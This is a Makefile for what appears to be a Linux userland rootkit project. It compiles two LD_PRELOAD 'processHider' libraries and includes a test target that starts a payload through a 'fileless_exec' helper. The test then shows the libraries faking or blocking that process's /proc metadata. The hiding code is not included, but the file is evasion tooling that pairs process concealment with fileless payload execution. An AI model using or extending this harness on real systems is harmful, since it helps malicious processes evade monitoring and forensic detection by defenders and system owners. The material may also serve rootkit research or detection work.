CC := gcc
CFLAGS := -fPIC -shared -ldl -O2 -Wall -Wextra
TARGETS := libprocessHider.so libprocessHider_v2.so

all: $(TARGETS)

libprocessHider.so: processHider.c
	$(CC) $(CFLAGS) $< -o $@

libprocessHider_v2.so: processHider_v2.c
	$(CC) $(CFLAGS) $< -o $@

clean:
	rm -f $(TARGETS)

test: libprocessHider_v2.so
	@echo "=== Testing Enhanced Process Hiding ==="
	@echo ""
	@echo "Starting hidden process..."
	@cd ../payloads && ./fileless_exec ./simple_payload &
	@HIDDEN=$$!; \
	sleep 2; \
	echo "PID: $$HIDDEN"; \
	echo ""; \
	echo "1. WITHOUT LD_PRELOAD (process visible):"; \
	cat /proc/$$HIDDEN/comm 2>/dev/null || echo "   (cannot read)"; \
	cat /proc/$$HIDDEN/stat 2>/dev/null | cut -d' ' -f1-2 || echo "   (cannot read)"; \
	ls -la /proc/$$HIDDEN/exe 2>/dev/null || echo "   (cannot read)"; \
	echo ""; \
	echo "2. WITH LD_PRELOAD_v2 (metadata faked):"; \
	HIDE_PIDS=$$HIDDEN LD_PRELOAD=./libprocessHider_v2.so cat /proc/$$HIDDEN/comm 2>/dev/null || echo "   [BLOCKED]"; \
	HIDE_PIDS=$$HIDDEN LD_PRELOAD=./libprocessHider_v2.so cat /proc/$$HIDDEN/stat 2>/dev/null | cut -d' ' -f1-2 || echo "   [BLOCKED]"; \
	HIDE_PIDS=$$HIDDEN LD_PRELOAD=./libprocessHider_v2.so ls -la /proc/$$HIDDEN/exe 2>/dev/null || echo "   [BLOCKED]"; \
	echo ""; \
	kill $$HIDDEN 2>/dev/null || true

.PHONY: all clean test

